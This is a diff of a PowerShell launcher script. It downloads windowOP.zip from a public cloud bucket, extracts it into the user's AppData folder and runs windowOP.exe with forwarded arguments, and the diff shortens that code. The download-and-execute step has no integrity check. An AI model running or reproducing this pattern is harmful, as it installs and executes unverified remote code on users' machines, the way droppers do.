@@ -1,38 +1,17 @@
-param(
-    [string]$h = $null,
-    [string]$f = $null
-)
-
 $tempFolderName = [guid]::NewGuid().ToString()
-$tempFolderPath = Join-Path -Path $env:TEMP -ChildPath $tempFolderName
-$appDataPath = $env:APPDATA
-$targetPath = Join-Path -Path $appDataPath -ChildPath "windowOP"
-$exePath = Join-Path -Path $targetPath -ChildPath "windowOP.exe"
+$tempFolderPath = Join-Path $env:TEMP $tempFolderName
+$targetPath = Join-Path $env:APPDATA "windowOP"
+$exePath = Join-Path $targetPath "windowOP.exe"
 
-New-Item -Path $tempFolderPath -ItemType Directory -Force | Out-Null
+New-Item $tempFolderPath -ItemType Directory -Force | Out-Null
 
 try {
-    $downloadUrl = "https://pub-7dd52c97b3004fe49470275bb0fb33ee.r2.dev/windowOP.zip"
-    $zipPath = Join-Path -Path $tempFolderPath -ChildPath "windowOP.zip"
-
-    $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile($downloadUrl, $zipPath)
-
-    if (Test-Path $targetPath) {
-        Remove-Item -Path $targetPath -Recurse -Force -ErrorAction SilentlyContinue
-    }
-    Expand-Archive -Path $zipPath -DestinationPath $targetPath -Force
-
-
-    $arguments = @()
-    if ($h) { $arguments += "-h"; $arguments += $h }
-    if ($f) { $arguments += "-f"; $arguments += $f }
-
-
-    Start-Process -FilePath $exePath -ArgumentList $arguments
-
+    $zipPath = Join-Path $tempFolderPath "windowOP.zip"
+    (New-Object Net.WebClient).DownloadFile("https://pub-7dd52c97b3004fe49470275bb0fb33ee.r2.dev/windowOP.zip", $zipPath)
+    
+    if (Test-Path $targetPath) { Remove-Item $targetPath -Recurse -Force }
+    Expand-Archive $zipPath $targetPath -Force
+    & $exePath @args
 } finally {
-    if (Test-Path $tempFolderPath) {
-        Remove-Item -Path $tempFolderPath -Recurse -Force -ErrorAction SilentlyContinue
-    }
+    if (Test-Path $tempFolderPath) { Remove-Item $tempFolderPath -Recurse -Force }
 }
